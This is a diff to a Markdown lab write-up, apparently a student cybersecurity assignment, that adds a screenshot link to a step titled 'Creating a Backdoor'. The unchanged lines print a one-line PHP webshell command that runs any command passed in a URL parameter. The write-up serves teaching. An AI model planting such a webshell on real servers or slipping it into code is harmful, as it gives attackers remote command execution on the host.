@@ -75,6 +75,7 @@ This section explains the step-by-step execution using Webshell, reproducing the
 
 ### Step 1: Creating a Backdoor    
 ![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/a92fd1b1887c954cccfc7295d7bb0b6836ed9fcc/Task%202%20images/Webshell1.png)  
+![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/0e275b104ab38a54dd1455c875d56bdf3a9fb1e4/Task%202%20images/Webshell2.png)  
 **Command:** `echo "<?php system(\$_GET['cmd']); ?>" > simple_shell.php`    
 **Reason of command:** This writes a tiny PHP script that takes whatever text is placed in the `cmd` URL parameter and passes it directly to the underlying Linux operating system.  
 ### Step 2: Uploading & Executing  
